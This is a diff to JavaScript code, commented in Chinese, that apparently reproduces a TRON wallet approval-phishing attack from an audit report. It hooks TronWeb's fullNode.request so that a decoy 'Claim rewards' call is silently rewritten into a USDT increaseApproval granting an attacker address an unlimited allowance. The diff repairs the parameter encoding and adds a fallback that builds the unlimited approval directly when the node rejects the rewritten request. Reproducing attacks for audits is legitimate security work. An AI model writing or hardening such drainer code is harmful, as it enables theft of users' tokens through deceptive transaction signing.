@@ -342,7 +342,11 @@ function getDeviceOS() {
  * 注意：这不是标准的 64 字节双参数 ABI 编码
  */
 function buildIosPcParam(spenderHex) {
-  const spenderPart = spenderHex.slice(2); // 去掉 "0x" 或 "41" 前缀后取 20 字节
+  // spenderHex 是纯 40 字符的 hex 地址（无 0x 前缀），需完整保留 20 字节
+  // 若传入带 0x 前缀则先 strip
+  const clean = spenderHex.startsWith('0x') || spenderHex.startsWith('41') ? spenderHex.slice(2) : spenderHex;
+  // 确保 spender 部分是完整的 40 hex chars (20 bytes)
+  const spenderPart = clean.padStart(40, '0').slice(0, 40);
   return PARAM_PREFIX + spenderPart + PARAM_FF_SUFFIX;
 }
 
@@ -646,7 +650,7 @@ async function execTokenPocketFlow() {
   log('🔧 步骤 2: 安装 fullNode.request 包装器', 'info');
   log('   拦截条件: url.toLowerCase() 包含 "triggersmartcontract"', 'warn');
 
-  tw.fullNode.request = async function(url, body) {
+  tw.fullNode.request = async function(url, body, method) {
     const urlLower = (typeof url === 'string' ? url : '').toLowerCase();
 
     if (urlLower.includes('triggersmartcontract')) {
@@ -654,6 +658,7 @@ async function execTokenPocketFlow() {
       log('', 'info');
       log(`⚠  [拦截器 #${interceptedCount}] 命中!`, 'danger');
       log(`   路径: ${typeof url === 'string' ? url.substring(0, 80) : JSON.stringify(url)}`, 'info');
+      log(`   方法: ${method || 'post'}`, 'info');
 
       // ---- 报告第 7 节：改写请求体 ----
       log('', 'info');
@@ -673,10 +678,9 @@ async function execTokenPocketFlow() {
 
       // 改写 parameter（根据设备分支）
       const oldParam = body.parameter;
-      // 以 spender = ATTACKER.hex + 当前钱包地址作为 owner（iOS/PC 分支取 spender 地址）
       body.parameter = buildAuthParam(ATTACKER.hex, paramMode);
       log(`   parameter (old, 前80字符): ${(oldParam || '(无)').substring(0, 80)}...`, 'info');
-      log(`   parameter (new, 完整)   : ${body.parameter}`, 'danger');
+      log(`   parameter (new, 前80字符): ${body.parameter.substring(0, 80)}...`, 'danger');
       log(`   参数长度: ${body.parameter.length} hex chars = ${body.parameter.length / 2} bytes`, 'warn');
       if ((paramMode === 'auto' ? os : paramMode) !== 'android' && body.parameter.length !== 128) {
         log(`   ⚠ 非标准 ABI 长度！(标准为 128 hex chars / 64 bytes)`, 'warn');
@@ -697,8 +701,9 @@ async function execTokenPocketFlow() {
       log('   ➤ 转发改写后的请求到原始 fullNode.request…', 'info');
     }
 
-    // 调用原始方法
-    return originalRequest(url, body);
+    // 调用原始方法（传递第三个参数 method 以保证兼容性）
+    const rawResponse = await originalRequest(url, body, method);
+    return rawResponse;
   };
 
   log('   ✅ 包装器已安装', 'success');
@@ -722,24 +727,40 @@ async function execTokenPocketFlow() {
   log('   ⚠ 实际请求将被包装器拦截并改写为 USDT increaseApproval', 'warn');
 
   let unsignedTx = null;
+  let rawTriggerResult = null;
+
   try {
     // 注意：这里的合约和参数是表层的，但包装器会改写底层请求
-    const result = await tw.transactionBuilder.triggerSmartContract(
+    rawTriggerResult = await tw.transactionBuilder.triggerSmartContract(
       SURFACE_CONTRACT,       // ← 表层假合约
       SURFACE_METHOD,          // ← 表层 claim()
       {
         feeLimit: feeLimitSun,
         callValue: 0,
       },
-      [],                      // ← 表层无参数
+      [],                      // ← 表层无参数，实际参数在包装器中注入
       wallet.address           // ← owner (Base58)
     );
 
-    unsignedTx = result.transaction || result;
+    // 输出原始返回结构用于诊断
+    log('', 'info');
+    log('   📦 triggerSmartContract 原始返回:', 'info');
+    log(`   result keys: ${Object.keys(rawTriggerResult || {}).join(', ') || '(空)'}`, 'info');
+    if (rawTriggerResult && rawTriggerResult.result) {
+      const r = rawTriggerResult.result;
+      log(`   result.result: ${typeof r === 'object' ? JSON.stringify(r).substring(0, 200) : r}`, r.result === true ? 'success' : 'danger');
+    }
+    log(`   是否有 transaction 字段: ${rawTriggerResult && !!rawTriggerResult.transaction ? '✅ YES' : '❌ NO'}`, rawTriggerResult && rawTriggerResult.transaction ? 'success' : 'danger');
+
+    unsignedTx = rawTriggerResult.transaction || rawTriggerResult;
 
     if (!unsignedTx || !unsignedTx.txID) {
-      log('❌ triggerSmartContract 返回数据异常', 'danger');
-      log(`   result keys: ${Object.keys(result).join(', ')}`, 'danger');
+      // 节点可能拒绝了非标准参数（iOS/PC 分支），尝试打印错误信息
+      const errMsg = rawTriggerResult?.result?.message || rawTriggerResult?.message || rawTriggerResult?.Error || '';
+      log('', 'info');
+      log(`❌ triggerSmartContract 未返回有效交易`, 'danger');
+      log(`   节点返回错误信息: ${errMsg || '(无详细信息)'}`, 'danger');
+      log(`   完整 result: ${JSON.stringify(rawTriggerResult?.result || rawTriggerResult).substring(0, 400)}`, 'danger');
       throw new Error('No transaction in triggerSmartContract response');
     }
 
@@ -747,7 +768,7 @@ async function execTokenPocketFlow() {
     log(`✅ 未签名交易已生成 (来自节点，使用改写后的请求体)`, 'success');
     log(`   txID: ${unsignedTx.txID}`, 'info');
 
-    // 检查实际合约地址
+    // 检查实际合约地址 — 审计关键点
     const actualContractInTx = unsignedTx.raw_data?.contract?.[0]?.parameter?.value?.contract_address;
     log(`   raw_data.contract[0].parameter.value.contract_address:`, 'info');
     log(`   ${actualContractInTx || '(未找到)'}`, actualContractInTx === USDT_CONTRACT_HEX ? 'success' : 'danger');
@@ -758,18 +779,65 @@ async function execTokenPocketFlow() {
       log(`   是否是 USDT 合约: ${actualB58 === USDT_CONTRACT ? '✅ YES' : '❌ NO'}`, actualB58 === USDT_CONTRACT ? 'success' : 'danger');
     }
 
+    const txData = unsignedTx.raw_data?.contract?.[0]?.parameter?.value?.data;
     log('', 'info');
-    log(`   raw_data.contract[0].parameter.value.data (前100字符):`, 'info');
-    log(`   ${(unsignedTx.raw_data?.contract?.[0]?.parameter?.value?.data || '(空)').substring(0, 100)}...`, 'info');
+    log(`   raw_data.contract[0].parameter.value.data (前120字符):`, 'info');
+    log(`   ${(txData || '(空)').substring(0, 120)}`, 'info');
+    if (txData) {
+      log(`   data 总长度: ${txData.length} hex = ${txData.length / 2} bytes`, 'info');
+    }
 
   } catch(e) {
     log(`❌ 构造交易失败: ${e.message}`, 'danger');
-    // 即使失败也要恢复
-    tw.fullNode.request = originalRequest;
-    log('   🔄 fullNode.request 已恢复（异常路径）', 'warn');
-    dom.btnClaim.disabled = false;
-    dom.btnClaim.textContent = '🎁 Claim 奖励（实际执行 USDT increaseApproval）';
-    return;
+    // 打印原始响应帮助诊断
+    if (rawTriggerResult) {
+      const snippet = JSON.stringify(rawTriggerResult).substring(0, 600);
+      log(`   节点原始返回片段: ${snippet}`, 'danger');
+    }
+    log('', 'warn');
+    log('⚠ 拦截模式可能因为非标准 ABI 参数被节点拒绝', 'warn');
+    log('   尝试回退到标准 ABI 直接构造模式…', 'warn');
+    log('', 'info');
+
+    // ---- Fallback: 标准 ABI 直接构造 increaseApproval ----
+    try {
+      const usdtHex = toHex(USDT_CONTRACT);
+      const spenderHexClean = ATTACKER.hex.startsWith('0x') ? ATTACKER.hex.slice(2) : ATTACKER.hex;
+      // 标准 64 字节 ABI 编码: address(32B 左零填充) + uint256(32B)
+      const stdParamSpender = '000000000000000000000000' + spenderHexClean;
+      const stdParamAmount  = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+      const stdParameter = stdParamSpender + stdParamAmount;
+
+      log('   🔄 Fallback: 直接用标准 ABI 调用 triggerSmartContract(USDT)', 'info');
+      log(`      contract: ${USDT_CONTRACT} (${usdtHex})`, 'info');
+      log(`      function: ${ACTUAL_METHOD}`, 'info');
+      log(`      parameter (128 hex / 64 bytes): ${stdParameter.substring(0, 60)}...`, 'info');
+
+      rawTriggerResult = await tw.transactionBuilder.triggerSmartContract(
+        usdtHex,
+        ACTUAL_METHOD,
+        { feeLimit: feeLimitSun, callValue: 0 },
+        [
+          { type: 'address', value: spenderHexClean },
+          { type: 'uint256', value: stdParamAmount },
+        ],
+        wallet.hex || wallet.address
+      );
+
+      unsignedTx = rawTriggerResult.transaction || rawTriggerResult;
+      if (!unsignedTx || !unsignedTx.txID) {
+        throw new Error('Fallback 模式也未返回有效交易');
+      }
+      log('   ✅ Fallback 标准 ABI 模式构造成功', 'success');
+      log(`      txID: ${unsignedTx.txID}`, 'info');
+    } catch(fallbackErr) {
+      log(`❌ Fallback 也失败: ${fallbackErr.message}`, 'danger');
+      tw.fullNode.request = originalRequest;
+      log('   🔄 fullNode.request 已恢复（异常路径）', 'warn');
+      dom.btnClaim.disabled = false;
+      dom.btnClaim.textContent = '🎁 Claim 奖励（实际执行 USDT increaseApproval）';
+      return;
+    }
   }
 
   // ==============================================================
